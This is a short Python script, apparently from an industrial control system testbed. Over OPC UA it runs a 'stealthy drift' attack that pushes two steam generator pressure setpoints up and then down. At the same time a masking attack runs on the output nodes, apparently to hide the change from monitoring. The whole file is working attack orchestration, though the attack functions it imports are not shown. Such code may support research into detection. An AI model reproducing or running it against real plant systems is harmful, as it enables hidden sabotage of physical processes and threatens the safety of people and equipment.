import asyncio
import logging
from asyncua import Client #type:ignore
from opcua import get_nodeid, AnalogueInput, AnalogueOutput, DigitalOutput

from stealthy import stealthy_drift_attack, mask_attack

logger = logging.getLogger(__name__)

async def main():
	duration = 300
	rate = 10
	drift= 0.02e6
	oscil = 2e3
	period= 45
	
	async with Client(url='opc.tcp://10.2.1.10:53530/') as client:
		await client.load_data_type_definitions()
		SG1Press = client.get_node(get_nodeid(AnalogueInput.CTRL_SG1PressSetpoint ))
		SG2Press = client.get_node(get_nodeid(AnalogueInput.CTRL_SG2PressSetpoint))

		mask_ids = list(AnalogueOutput) 
		mask_ids.remove(AnalogueOutput.INT_SimulationTime)
		mask_ids+= list(DigitalOutput)

		mask_nodes = [
			client.get_node(get_nodeid(nid)) for nid in mask_ids
		]
		mask_duration = duration*3

		mask_task = asyncio.create_task(mask_attack(client, mask_duration, rate, mask_nodes))

        # Phase 1: SG1 up and SG2 up
		await asyncio.gather(
			stealthy_drift_attack(client, SG1Press, duration, rate, +drift, oscil, period),
			stealthy_drift_attack(client, SG2Press, duration, rate, +drift, oscil, period)
			)

        # Phase 2: SG1 down and SG2 down to conserve fuel 
		await asyncio.gather(
			stealthy_drift_attack(client, SG1Press, duration, rate, -drift, oscil, period),
			stealthy_drift_attack(client, SG2Press, duration, rate, -drift, oscil, period)
			)

		# wait for end of masking
		await mask_task

        
		
if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO)
	asyncio.run(main())